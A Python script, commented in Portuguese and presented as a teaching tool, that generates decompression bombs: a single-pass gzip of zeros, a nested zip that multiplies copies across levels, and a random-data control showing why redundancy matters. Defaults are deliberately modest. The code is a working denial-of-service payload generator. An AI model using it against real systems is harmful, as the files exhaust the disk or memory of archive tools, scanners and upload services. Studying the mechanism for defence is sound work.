#!/usr/bin/env python3
"""Gerador didático de zip bombs.

Duas construções clássicas + um grupo de controle:

  simples   arquivo altamente redundante comprimido uma vez.
            Razão limitada pelo teto do DEFLATE (~1032:1 por fluxo).
  aninhada  zip contendo k cópias de um zip, por n níveis.
            O total descomprimido multiplica: fundo * k**n.
  controle  bytes aleatórios no mesmo pipeline.
            Mostra que sem redundância não há bomba (~1:1).

Os defaults são deliberadamente modestos (GB, não TB/PB): o objetivo
é estudar o mecanismo, não lotar disco de ninguém.

Exemplos:
    python3 gerador.py simples
    python3 gerador.py aninhada --niveis 3 --copias 4
    python3 gerador.py controle
"""
from __future__ import annotations

import argparse
import gzip
import io
import os
import zipfile

TAMANHO_BLOCO = 1 << 20  # 1 MiB por bloco: tudo em streaming, o conteúdo inteiro nunca vai pra RAM


def formatar_tamanho(valor: float) -> str:
    """Formata uma quantidade de bytes em unidades legíveis (KiB, MiB, ...)."""
    for unidade in ("B", "KiB", "MiB", "GiB", "TiB"):
        if valor < 1024:
            return f"{valor:.1f} {unidade}"
        valor /= 1024
    return f"{valor:.1f} PiB"


def gerar_simples(destino: str, tamanho: int, aleatorio: bool = False) -> None:
    """Comprime `tamanho` bytes em streaming (zeros ou aleatório)."""
    with gzip.open(destino, "wb", compresslevel=9) as arquivo_gzip:
        bytes_escritos = 0
        while bytes_escritos < tamanho:
            bloco = os.urandom(TAMANHO_BLOCO) if aleatorio else b"\0" * TAMANHO_BLOCO
            arquivo_gzip.write(bloco)
            bytes_escritos += TAMANHO_BLOCO

    tamanho_comprimido = os.path.getsize(destino)
    print(f"[{destino}]")
    print(f"  descomprimido: {formatar_tamanho(tamanho)}")
    print(f"  comprimido:    {formatar_tamanho(tamanho_comprimido)}")
    print(f"  razão:         {tamanho / tamanho_comprimido:.1f}:1")


def gerar_aninhada(destino: str, tamanho_fundo: int, niveis: int, copias: int) -> None:
    """Zip com `copias` cópias do zip anterior, `niveis` vezes.

    Cada nível multiplica por `copias` o total que seria materializado
    se alguém extraísse tudo recursivamente. As cópias de um mesmo nível
    são entradas independentes no zip — o ganho vem da multiplicação
    estrutural, não da compressão entre cópias.
    """
    # camada mais interna: um zip com um único arquivo redundante
    zip_interno = io.BytesIO()
    with zipfile.ZipFile(zip_interno, "w", zipfile.ZIP_DEFLATED) as arquivo_zip:
        with arquivo_zip.open("zeros.bin", "w") as entrada:
            bytes_escritos = 0
            while bytes_escritos < tamanho_fundo:
                entrada.write(b"\0" * TAMANHO_BLOCO)
                bytes_escritos += TAMANHO_BLOCO

    zip_atual = zip_interno.getvalue()
    for nivel in range(niveis):
        zip_novo = io.BytesIO()
        with zipfile.ZipFile(zip_novo, "w", zipfile.ZIP_DEFLATED) as arquivo_zip:
            for indice_copia in range(copias):
                arquivo_zip.writestr(f"nivel{nivel + 1}_copia{indice_copia:02d}.zip", zip_atual)
        zip_atual = zip_novo.getvalue()

    with open(destino, "wb") as arquivo:
        arquivo.write(zip_atual)

    total_descomprimido = tamanho_fundo * copias**niveis
    print(f"[{destino}]")
    print(f"  estrutura:     fundo de {formatar_tamanho(tamanho_fundo)} x {copias}^{niveis} cópias")
    print(f"  arquivo final: {formatar_tamanho(len(zip_atual))}")
    print(f"  se extraído:   {formatar_tamanho(total_descomprimido)}")
    print(f"  razão:         {total_descomprimido / len(zip_atual):.1f}:1")


def main() -> None:
    parser = argparse.ArgumentParser(description="Gerador didático de zip bombs")
    subcomandos = parser.add_subparsers(dest="tipo", required=True)

    parser_simples = subcomandos.add_parser(
        "simples", help="arquivo redundante comprimido uma vez (~1032:1)"
    )
    parser_simples.add_argument("--tamanho-mib", type=int, default=1024)

    parser_aninhada = subcomandos.add_parser(
        "aninhada", help="zip com k cópias em n níveis (multiplicação)"
    )
    parser_aninhada.add_argument("--fundo-mib", type=int, default=100)
    parser_aninhada.add_argument("--niveis", type=int, default=3)
    parser_aninhada.add_argument("--copias", type=int, default=4)

    parser_controle = subcomandos.add_parser(
        "controle", help="bytes aleatórios: sem redundância não há bomba"
    )
    parser_controle.add_argument("--tamanho-mib", type=int, default=64)

    for subparser in (parser_simples, parser_aninhada, parser_controle):
        subparser.add_argument(
            "--destino",
            default=os.path.join(os.path.dirname(os.path.abspath(__file__)), "artefatos"),
            help="diretório de saída (default: artefatos/ ao lado do script)",
        )

    argumentos = parser.parse_args()
    os.makedirs(argumentos.destino, exist_ok=True)

    if argumentos.tipo == "simples":
        gerar_simples(
            os.path.join(argumentos.destino, "bomba_simples.gz"),
            argumentos.tamanho_mib << 20,
        )
    elif argumentos.tipo == "controle":
        gerar_simples(
            os.path.join(argumentos.destino, "controle_aleatorio.gz"),
            argumentos.tamanho_mib << 20,
            aleatorio=True,
        )
    else:
        gerar_aninhada(
            os.path.join(argumentos.destino, "bomba_aninhada.zip"),
            argumentos.fundo_mib << 20,
            argumentos.niveis,
            argumentos.copias,
        )


if __name__ == "__main__":
    main()
